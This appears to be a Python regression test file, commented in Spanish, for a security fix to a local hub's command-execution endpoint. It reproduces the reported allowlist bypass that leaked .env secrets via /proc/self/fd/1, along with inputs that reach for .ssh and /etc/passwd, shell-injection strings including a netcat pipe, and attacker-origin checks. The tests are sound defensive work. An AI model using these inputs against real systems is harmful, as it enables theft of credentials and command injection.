# -*- coding: utf-8 -*-
"""VCD-02: la allowlist de `/api/run-safe-command` era evadible.

Del diagnostico de seguridad del repo (2026-07-27). El endpoint no autentica y
la allowlist aceptaba cualquier cadena que EMPEZARA por un prefijo permitido,
asi que el prefijo amplio `flujo privacy` dejaba pasar:

    flujo privacy sanitize .env.example --output /proc/self/fd/1

que devolvia el contenido del archivo por stdout. En Linux, con `.env` en vez
del ejemplo, eso son las claves. Se reprodujo alli con una peticion `text/plain`
desde un origen externo -- `text/plain` no dispara preflight, asi que el CORS
`*` de las respuestas no protegia nada.

Estos tests son los ataques del informe, escritos para que fallen si vuelven.
"""
from __future__ import annotations

from flujo.web.hub import HubRequestHandler, MAX_BODY_BYTES


def _seguro(cmd: str) -> bool:
    return HubRequestHandler._is_safe_cmd(HubRequestHandler, cmd)


def test_el_ataque_del_diagnostico_ya_no_pasa():
    assert not _seguro(
        "flujo privacy sanitize .env.example --output /proc/self/fd/1")
    assert not _seguro("flujo privacy sanitize .env --output /tmp/robado")


def test_no_se_pueden_pedir_rutas_absolutas():
    assert not _seguro("flujo job prepare /home/user/.ssh")
    assert not _seguro("flujo job prepare C:\\Users\\alguien\\.ssh")
    assert not _seguro("flujo job prepare ~/.ssh")
    assert not _seguro("flujo job prepare ../../etc/passwd")


def test_el_prefijo_tiene_que_terminar_en_limite_de_palabra():
    """`flujo version-not-safe` pasaba solo por empezar igual."""
    assert not _seguro("flujo version-not-safe")
    assert not _seguro("flujo privacyzzz robar")
    assert not _seguro("flujo datadropX")


def test_solo_pasan_los_flags_declarados():
    assert _seguro("flujo job new --json")
    assert not _seguro("flujo job new --output /tmp/x")
    assert not _seguro("flujo job new --exec")


def test_nada_con_metacaracteres_de_shell():
    for malo in ("flujo daily; id", "flujo daily && id", "flujo daily | nc x 1",
                 "flujo daily `id`", "flujo daily $(id)", "flujo daily > /tmp/x"):
        assert not _seguro(malo), malo


def test_lo_legitimo_sigue_funcionando():
    for bueno in ("flujo version", "flujo health", "flujo daily",
                  "py -m flujo version",
                  "flujo job new", "flujo datadrop scan", "flujo job new --json"):
        assert _seguro(bueno), bueno


def test_comillas_sin_cerrar_no_rompen_el_parser():
    assert not _seguro('flujo job new "sin cerrar')


def test_un_comando_absurdamente_largo_no_entra():
    assert not _seguro("flujo daily " + "a" * 500)


class _Cabeceras(dict):
    def get(self, k, d=None):
        return dict.get(self, k, d)


def _origen(origen: str, host: str) -> bool:
    fake = HubRequestHandler.__new__(HubRequestHandler)
    fake.headers = _Cabeceras({"Host": host, "Origin": origen})
    return HubRequestHandler._origen_propio(fake, origen)


def test_un_origen_ajeno_no_entra():
    """El caso exacto del informe: una pagina cualquiera llamando al hub."""
    assert not _origen("https://attacker.example", "127.0.0.1:8765")
    assert not _origen("http://evil.local:8765", "127.0.0.1:8765")
    assert not _origen("file://", "127.0.0.1:8765")


def test_el_propio_hub_si_entra():
    assert _origen("http://127.0.0.1:8765", "127.0.0.1:8765")
    assert _origen("http://localhost:8765", "localhost:8765")
    # el hub cambia de puerto si el 8765 esta ocupado: por eso se compara
    # contra el Host de la peticion y no contra una lista escrita
    assert _origen("http://127.0.0.1:8790", "127.0.0.1:8790")


class _CuerpoNoLeible:
    def read(self, _length):
        raise AssertionError("no se debe leer un cuerpo que excede el limite")


def test_el_limite_global_rechaza_antes_de_leer():
    fake = HubRequestHandler.__new__(HubRequestHandler)
    fake.path = "/api/plano/render"
    fake.headers = _Cabeceras({"Content-Length": str(MAX_BODY_BYTES + 1)})
    fake.rfile = _CuerpoNoLeible()
    respuesta = {}
    fake._send_json = lambda body, status=200: respuesta.update(body=body, status=status)

    HubRequestHandler.do_POST(fake)

    assert respuesta == {"body": {"error": "cuerpo demasiado grande"}, "status": 413}
